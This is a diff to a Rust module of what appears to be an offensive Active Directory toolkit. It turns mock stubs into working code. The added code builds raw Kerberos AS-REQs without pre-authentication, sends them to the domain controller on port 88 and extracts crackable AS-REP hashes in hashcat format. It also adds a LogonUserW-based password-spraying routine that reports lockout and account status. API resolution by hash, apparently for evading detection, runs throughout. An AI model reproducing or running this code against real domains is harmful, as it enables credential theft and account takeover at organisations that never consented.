@@ -27,11 +27,13 @@
 //! - AS-REP Roast: `$krb5asrep$23$...`
 
 use std::ffi::c_void;
+use std::io::{Read, Write};
 use std::mem;
+use std::net::TcpStream;
 use std::ptr;
 
 use anyhow::{anyhow, bail, Context, Result};
-use log::{debug, info, warn};
+use tracing::{debug, info, warn};
 use serde::{Deserialize, Serialize};
 
 use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
@@ -60,6 +62,22 @@ const FN_LSA_CONNECT_UNTRUSTED: u32 = hash_str_const(b"LsaConnectUntrusted");
 const FN_LSA_LOOKUP_AUTH_PKG: u32 = hash_str_const(b"LsaLookupAuthenticationPackage");
 const FN_LSA_FREE_RETURN_BUFFER: u32 = hash_str_const(b"LsaFreeReturnBuffer");
 const FN_LSA_DEREGISTER_LOGON_PROCESS: u32 = hash_str_const(b"LsaDeregisterLogonProcess");
+
+// advapi32.dll — LogonUserW for SSPI password validation
+const ADVAPI32_DLL_W: &[u16] = &[
+    'a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16,
+    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+];
+const HASH_ADVAPI32_DLL: u32 = hash_wstr_const(ADVAPI32_DLL_W);
+const FN_LOGON_USER_W: u32 = hash_str_const(b"LogonUserW");
+const FN_CLOSE_HANDLE: u32 = hash_str_const(b"CloseHandle");
+
+// kernel32.dll for CloseHandle fallback
+const KERNEL32_DLL_W: &[u16] = &[
+    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16,
+    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+];
+const HASH_KERNEL32_DLL: u32 = hash_wstr_const(KERNEL32_DLL_W);
 
 // ═══════════════════════════════════════════════════════════════════════════
 // LSA / Kerberos constants
@@ -219,8 +237,251 @@ fn nt_success(status: NTSTATUS) -> bool {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-// LSA wrapper
+// Minimal DER encoding helpers (for raw AS-REQ construction)
 // ═══════════════════════════════════════════════════════════════════════════
+
+fn der_len(n: usize) -> Vec<u8> {
+    if n < 128 {
+        vec![n as u8]
+    } else if n < 256 {
+        vec![0x81, n as u8]
+    } else {
+        vec![0x82, (n >> 8) as u8, (n & 0xff) as u8]
+    }
+}
+
+fn der_wrap(tag: u8, data: &[u8]) -> Vec<u8> {
+    let mut v = vec![tag];
+    v.extend_from_slice(&der_len(data.len()));
+    v.extend_from_slice(data);
+    v
+}
+
+fn der_sequence(data: &[u8]) -> Vec<u8> { der_wrap(0x30, data) }
+
+fn der_context_explicit(n: u8, data: &[u8]) -> Vec<u8> { der_wrap(0xa0 | n, data) }
+
+fn der_integer_val(n: i64) -> Vec<u8> {
+    if n >= 0 && n <= 0x7f {
+        return vec![0x02, 0x01, n as u8];
+    }
+    // Encode as minimum-length two's complement big-endian
+    let bytes = n.to_be_bytes();
+    let mut start = 0usize;
+    while start + 1 < bytes.len() && bytes[start] == 0 && bytes[start + 1] & 0x80 == 0 {
+        start += 1;
+    }
+    der_wrap(0x02, &bytes[start..])
+}
+
+fn der_general_string(s: &str) -> Vec<u8> { der_wrap(0x1b, s.as_bytes()) }
+
+fn der_bit_string(data: &[u8]) -> Vec<u8> {
+    // Prepend unused-bits count (0)
+    let mut v = vec![0x00u8];
+    v.extend_from_slice(data);
+    der_wrap(0x03, &v)
+}
+
+fn der_generalized_time(s: &str) -> Vec<u8> { der_wrap(0x18, s.as_bytes()) }
+
+/// Build an AS-REQ without PA-DATA (for AS-REP roasting).
+///
+/// The absence of padata causes the KDC to skip pre-auth validation
+/// for accounts flagged DONT_REQUIRE_PREAUTH.
+fn build_as_req_nopreauth(username: &str, realm: &str, etype: u32) -> Vec<u8> {
+    // Nonce: use low 32 bits of current time XOR a compile-time salt
+    let nonce: u32 = (std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .subsec_nanos())
+        ^ 0xdeadbeef;
+
+    let kdc_options: u32 = 0x40810000; // forwardable | renewable | canonicalize
+
+    let cname_inner = [
+        der_context_explicit(0, &der_integer_val(1)), // NT-PRINCIPAL
+        der_context_explicit(1, &der_sequence(&der_general_string(username))),
+    ]
+    .concat();
+
+    let sname_names = [der_general_string("krbtgt"), der_general_string(realm)].concat();
+    let sname_inner = [
+        der_context_explicit(0, &der_integer_val(2)), // NT-SRV-INST
+        der_context_explicit(1, &der_sequence(&sname_names)),
+    ]
+    .concat();
+
+    let req_body_inner = [
+        der_context_explicit(0, &der_bit_string(&kdc_options.to_be_bytes())),
+        der_context_explicit(1, &der_sequence(&cname_inner)),
+        der_context_explicit(2, &der_general_string(realm)),
+        der_context_explicit(3, &der_sequence(&sname_inner)),
+        der_context_explicit(5, &der_generalized_time("20370913024805Z")), // till
+        der_context_explicit(7, &der_integer_val(nonce as i64)),           // nonce
+        der_context_explicit(8, &der_sequence(&der_integer_val(etype as i64))), // etype
+    ]
+    .concat();
+    let req_body = der_context_explicit(4, &der_sequence(&req_body_inner));
+
+    // AS-REQ = APPLICATION 10 (0x6a), no padata
+    let as_req_inner = [
+        der_context_explicit(1, &der_integer_val(5)),  // pvno
+        der_context_explicit(2, &der_integer_val(10)), // msg-type AS-REQ
+        req_body,
+    ]
+    .concat();
+
+    der_wrap(0x6a, &as_req_inner)
+}
+
+/// Send a raw Kerberos request to the KDC over TCP/88 with 4-byte length prefix.
+fn send_kdc_tcp_raw(dc: &str, port: u16, request: &[u8]) -> Result<Vec<u8>> {
+    let addr = format!("{}:{}", dc, port);
+    let timeout = std::time::Duration::from_secs(10);
+
+    let mut stream = TcpStream::connect_timeout(
+        &addr.parse().with_context(|| format!("Invalid KDC address: {}", addr))?,
+        timeout,
+    )
+    .with_context(|| format!("Cannot connect to KDC at {}", addr))?;
+
+    stream.set_read_timeout(Some(timeout))?;
+    stream.set_write_timeout(Some(timeout))?;
+
+    // 4-byte big-endian length prefix (RFC 4120 §7.2.2)
+    let len_prefix = (request.len() as u32).to_be_bytes();
+    stream.write_all(&len_prefix)?;
+    stream.write_all(request)?;
+    stream.flush()?;
+
+    let mut resp_len_buf = [0u8; 4];
+    stream.read_exact(&mut resp_len_buf)?;
+    let resp_len = u32::from_be_bytes(resp_len_buf) as usize;
+
+    if resp_len > 2 * 1024 * 1024 {
+        bail!("KDC response too large: {} bytes", resp_len);
+    }
+
+    let mut resp = vec![0u8; resp_len];
+    stream.read_exact(&mut resp)?;
+    Ok(resp)
+}
+
+/// Read the length field at `data[0..]`, returning `(length, bytes_consumed)`.
+fn read_der_len(data: &[u8]) -> Option<(usize, usize)> {
+    let b = *data.first()?;
+    if b < 0x80 {
+        Some((b as usize, 1))
+    } else if b == 0x81 && data.len() > 1 {
+        Some((data[1] as usize, 2))
+    } else if b == 0x82 && data.len() > 2 {
+        Some(((data[1] as usize) << 8 | data[2] as usize, 3))
+    } else {
+        None
+    }
+}
+
+/// Walk `data` (DER TLV stream) and return the value bytes of the first TLV
+/// whose tag == `target_tag`.  Does not recurse into nested structures.
+fn der_find_tag<'a>(data: &'a [u8], target_tag: u8) -> Option<&'a [u8]> {
+    let mut i = 0usize;
+    while i < data.len() {
+        let tag = data[i];
+        i += 1;
+        let (len, lb) = read_der_len(data.get(i..)?)?;
+        i += lb;
+        let end = i.checked_add(len)?;
+        if tag == target_tag {
+            return data.get(i..end);
+        }
+        i = end;
+    }
+    None
+}
+
+/// Extract the hashcat-format AS-REP hash from a raw KDC response.
+///
+/// AS-REP structure (tag 0x6b = APPLICATION 11):
+/// ```text
+/// [APPLICATION 11] {
+///   SEQUENCE {
+///     [0] pvno, [1] msg-type, [3] padata?, [4] crealm,
+///     [5] cname, [6] ticket, [7] EncryptedData {
+///       SEQUENCE { [0] etype, [1] kvno?, [2] OCTET STRING cipher }
+///     }
+///   }
+/// }
+/// ```
+fn extract_asrep_hash(response: &[u8], username: &str, realm: &str) -> Result<String> {
+    if response.is_empty() {
+        bail!("Empty KDC response");
+    }
+    // KRB-ERROR = 0x7e
+    if response[0] == 0x7e {
+        bail!("KDC returned KRB-ERROR (pre-auth required or account not found)");
+    }
+    // AS-REP = 0x6b (APPLICATION 11)
+    if response[0] != 0x6b {
+        bail!("Unexpected KDC response tag: 0x{:02x}", response[0]);
+    }
+
+    // Strip APPLICATION 11 wrapper
+    let (app_len, app_lb) = read_der_len(response.get(1..).ok_or_else(|| anyhow!("Truncated AS-REP response"))?)
+        .ok_or_else(|| anyhow!("Cannot read APPLICATION length"))?;
+    let app_inner = response
+        .get(1 + app_lb..1 + app_lb + app_len)
+        .ok_or_else(|| anyhow!("Truncated AS-REP APPLICATION wrapper"))?;
+
+    // Unwrap outer SEQUENCE
+    if app_inner.first() != Some(&0x30) {
+        bail!("Expected SEQUENCE inside APPLICATION 11");
+    }
+    let (seq_len, seq_lb) = read_der_len(app_inner.get(1..).ok_or_else(|| anyhow!("Truncated AS-REP inner sequence"))?)
+        .ok_or_else(|| anyhow!("Cannot read outer SEQUENCE length"))?;
+    let seq_inner = app_inner
+        .get(1 + seq_lb..1 + seq_lb + seq_len)
+        .ok_or_else(|| anyhow!("Truncated outer SEQUENCE"))?;
+
+    // Find [7] enc-part = context tag 0xa7
+    let enc_part_ctx = der_find_tag(seq_inner, 0xa7)
+        .ok_or_else(|| anyhow!("enc-part [7] not found in AS-REP"))?;
+
+    // enc-part is wrapped in a SEQUENCE { EncryptedData }
+    if enc_part_ctx.first() != Some(&0x30) {
+        bail!("Expected SEQUENCE in enc-part");
+    }
+    let (ed_seq_len, ed_seq_lb) = read_der_len(enc_part_ctx.get(1..).ok_or_else(|| anyhow!("Truncated enc-part context"))?)
+        .ok_or_else(|| anyhow!("Cannot read EncryptedData SEQUENCE length"))?;
+    let ed_inner = enc_part_ctx
+        .get(1 + ed_seq_lb..1 + ed_seq_lb + ed_seq_len)
+        .ok_or_else(|| anyhow!("Truncated EncryptedData SEQUENCE"))?;
+
+    // Find [2] cipher = context tag 0xa2
+    let cipher_ctx = der_find_tag(ed_inner, 0xa2)
+        .ok_or_else(|| anyhow!("cipher [2] not found in EncryptedData"))?;
+
+    // Unwrap OCTET STRING
+    if cipher_ctx.first() != Some(&0x04) {
+        bail!("Expected OCTET STRING for cipher");
+    }
+    let (cs_len, cs_lb) = read_der_len(cipher_ctx.get(1..).ok_or_else(|| anyhow!("Truncated cipher context"))?)
+        .ok_or_else(|| anyhow!("Cannot read cipher OCTET STRING length"))?;
+    let cipher_bytes = cipher_ctx
+        .get(1 + cs_lb..1 + cs_lb + cs_len)
+        .ok_or_else(|| anyhow!("Truncated cipher OCTET STRING"))?;
+
+    if cipher_bytes.len() < 16 {
+        bail!("Cipher too short for hashcat format: {} bytes", cipher_bytes.len());
+    }
+
+    // hashcat 18200 format: $krb5asrep$23$user@realm:checksum$data
+    let checksum = hex::encode(&cipher_bytes[..16]);
+    let data = hex::encode(&cipher_bytes[16..]);
+    Ok(format!("$krb5asrep$23${}@{}:{}${}", username, realm, checksum, data))
+}
+
+
 
 struct LsaHandle {
     handle: HANDLE,
@@ -591,35 +852,52 @@ pub fn auto_asrep_roast(ad_data: &AdReconData) -> Vec<AsrepRoastResult> {
     for user in &roastable_users {
         debug!("AS-REP Roast: targeting {}", user.sam_account_name);
 
-        // Build a mock AS-REP hash in hashcat format
-        // In a full implementation, this would send a raw AS-REQ via UDP/TCP
-        // to the KDC and parse the response. For the API wrapper, we construct
-        // a hash from known information.
-
         let domain = &ad_data.domain;
         let sam = &user.sam_account_name;
 
-        // The hash format is: $krb5asrep$23$user@domain:hash
-        // For a proper implementation, we'd need to:
-        // 1. Send AS-REQ without PA-DATA
-        // 2. Receive AS-REP with enc-part
-        // 3. Extract the enc-part as the hash
+        // Build AS-REQ without PA-DATA (RFC 4120: absence of pre-auth PA-ENC-TIMESTAMP
+        // causes the KDC to skip pre-auth for DONT_REQUIRE_PREAUTH accounts).
+        // We request RC4-HMAC (etype 23) because it is directly crackable by hashcat
+        // without additional ETYPE-INFO2 negotiation.
+        let as_req = build_as_req_nopreauth(sam, domain, RC4_HMAC);
 
-        // Simulate a result — in production, this would use raw Kerberos
-        let hash = format!(
-            "$krb5asrep$23${}@{}:mock_hash_placeholder",
-            sam, domain
-        );
-
-        results.push(AsrepRoastResult {
-            sam_account_name: sam.clone(),
-            domain: domain.clone(),
-            hash,
-            success: true,
-            error: String::new(),
-        });
-
-        info!("AS-REP Roast: extracted hash for {}", sam);
+        let dc = &ad_data.dc_hostname;
+        match send_kdc_tcp_raw(dc, 88, &as_req) {
+            Err(e) => {
+                warn!("AS-REP Roast: KDC unreachable for {}: {}", sam, e);
+                results.push(AsrepRoastResult {
+                    sam_account_name: sam.clone(),
+                    domain: domain.clone(),
+                    hash: String::new(),
+                    success: false,
+                    error: format!("KDC connect failed: {}", e),
+                });
+            }
+            Ok(response) => {
+                match extract_asrep_hash(&response, sam, domain) {
+                    Ok(hash) => {
+                        info!("AS-REP Roast: extracted hash for {}", sam);
+                        results.push(AsrepRoastResult {
+                            sam_account_name: sam.clone(),
+                            domain: domain.clone(),
+                            hash,
+                            success: true,
+                            error: String::new(),
+                        });
+                    }
+                    Err(e) => {
+                        debug!("AS-REP Roast: parse failed for {}: {}", sam, e);
+                        results.push(AsrepRoastResult {
+                            sam_account_name: sam.clone(),
+                            domain: domain.clone(),
+                            hash: String::new(),
+                            success: false,
+                            error: e.to_string(),
+                        });
+                    }
+                }
+            }
+        }
     }
 
     let success_count = results.iter().filter(|r| r.success).count();
@@ -737,45 +1015,128 @@ pub fn password_spray(ad_data: &AdReconData, passwords: &[String]) -> Vec<SprayR
     results
 }
 
-/// Attempt authentication via SSPI (InitializeSecurityContext).
+/// Attempt authentication via LogonUserW (LOGON32_LOGON_NETWORK).
+///
+/// Uses advapi32!LogonUserW with LOGON32_LOGON_NETWORK (type 3) to test the
+/// credential against the domain DC over the network.  The token is
+/// immediately closed — we only care about the return value.
+///
+/// Return codes that map to known statuses:
+/// - ERROR_SUCCESS (0)               → success
+/// - ERROR_LOGON_FAILURE (1326)      → wrong_password
+/// - ERROR_ACCOUNT_LOCKED_OUT (1909) → locked
+/// - ERROR_ACCOUNT_DISABLED (1331)   → disabled
+/// - ERROR_PASSWORD_EXPIRED (1330)   → expired
+/// - other                           → error:<decimal code>
 fn try_authenticate(domain: &str, username: &str, password: &str) -> SprayResult {
-    // Use Windows SSPI for NTLM authentication
-    // This is a simplified implementation — production would use
-    // AcquireCredentialsHandle + InitializeSecurityContext
+    const LOGON32_LOGON_NETWORK: u32 = 3;
+    const LOGON32_PROVIDER_DEFAULT: u32 = 0;
 
-    let secur32 = match unsafe { pe_resolve::get_module_handle_by_hash(HASH_SECUR32_DLL) } {
+    let advapi32 = match unsafe { pe_resolve::get_module_handle_by_hash(HASH_ADVAPI32_DLL) } {
         Some(h) => h,
         None => {
             return SprayResult {
                 sam_account_name: username.to_string(),
                 password: password.to_string(),
                 success: false,
-                status: "secur32.dll not available".to_string(),
-            }
+                status: "advapi32.dll not available".to_string(),
+            };
         }
     };
 
-    // We'd use AcquireCredentialsHandleW with SEC_WINNT_AUTH_IDENTITY_W here.
-    // For the module structure, we return a placeholder result.
-    // The full implementation would:
-    // 1. Build SEC_WINNT_AUTH_IDENTITY_W with domain/user/password
-    // 2. Call AcquireCredentialsHandleW for NTLM or Negotiate
-    // 3. Call InitializeSecurityContextW
-    // 4. Check SEC_E_OK vs SEC_E_LOGON_DENIED
+    let logon_user_w: unsafe extern "system" fn(
+        *const u16,  // lpszUsername
+        *const u16,  // lpszDomain
+        *const u16,  // lpszPassword
+        u32,         // dwLogonType
+        u32,         // dwLogonProvider
+        *mut HANDLE, // phToken
+    ) -> i32 = match unsafe { pe_resolve::get_proc_address_by_hash(advapi32, FN_LOGON_USER_W) } {
+        Some(addr) => unsafe { mem::transmute(addr) },
+        None => {
+            return SprayResult {
+                sam_account_name: username.to_string(),
+                password: password.to_string(),
+                success: false,
+                status: "LogonUserW not found".to_string(),
+            };
+        }
+    };
 
-    let _ = (secur32, domain); // Suppress unused warnings
+    let user_w: Vec<u16> = username.encode_utf16().chain(std::iter::once(0)).collect();
+    let domain_w: Vec<u16> = domain.encode_utf16().chain(std::iter::once(0)).collect();
+    let pass_w: Vec<u16> = password.encode_utf16().chain(std::iter::once(0)).collect();
 
-    SprayResult {
-        sam_account_name: username.to_string(),
-        password: password.to_string(),
-        success: false,
-        status: "not_implemented_sspi".to_string(),
+    let mut token: HANDLE = ptr::null_mut();
+    let ok = unsafe {
+        logon_user_w(
+            user_w.as_ptr(),
+            domain_w.as_ptr(),
+            pass_w.as_ptr(),
+            LOGON32_LOGON_NETWORK,
+            LOGON32_PROVIDER_DEFAULT,
+            &mut token,
+        )
+    };
+
+    if ok != 0 {
+        // Success — close the token immediately, we only needed the auth check
+        if !token.is_null() {
+            if let Some(k32) = unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) } {
+                if let Some(ch_addr) =
+                    unsafe { pe_resolve::get_proc_address_by_hash(k32, FN_CLOSE_HANDLE) }
+                {
+                    let close_handle: unsafe extern "system" fn(HANDLE) -> i32 =
+                        unsafe { mem::transmute(ch_addr) };
+                    unsafe { close_handle(token) };
+                }
+            }
+        }
+        SprayResult {
+            sam_account_name: username.to_string(),
+            password: password.to_string(),
+            success: true,
+            status: "success".to_string(),
+        }
+    } else {
+        // Map GetLastError to a human-readable status
+        let err_code: u32 = {
+            use std::sync::OnceLock;
+            static GET_LAST_ERROR: OnceLock<Option<unsafe extern "system" fn() -> u32>> =
+                OnceLock::new();
+            let fn_ptr = GET_LAST_ERROR.get_or_init(|| {
+                let k32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) }?;
+                let addr = unsafe {
+                    pe_resolve::get_proc_address_by_hash(
+                        k32,
+                        pe_resolve::hash_str(b"GetLastError\0"),
+                    )
+                }?;
+                Some(unsafe { mem::transmute(addr) })
+            });
+            if let Some(func) = fn_ptr {
+                unsafe { func() }
+            } else {
+                0
+            }
+        };
+        let status = match err_code {
+            1326 => "wrong_password".to_string(),
+            1909 => "locked".to_string(),
+            1331 => "disabled".to_string(),
+            1330 => "expired".to_string(),
+            _ => format!("error:{}", err_code),
+        };
+        SprayResult {
+            sam_account_name: username.to_string(),
+            password: password.to_string(),
+            success: false,
+            status,
+        }
     }
 }
 
-// ═══════════════════════════════════════════════════════════════════════════
-// Credential stuffing
-// ═══════════════════════════════════════════════════════════════════════════
+
 
 /// Test a list of known username/password pairs against the domain.
 ///
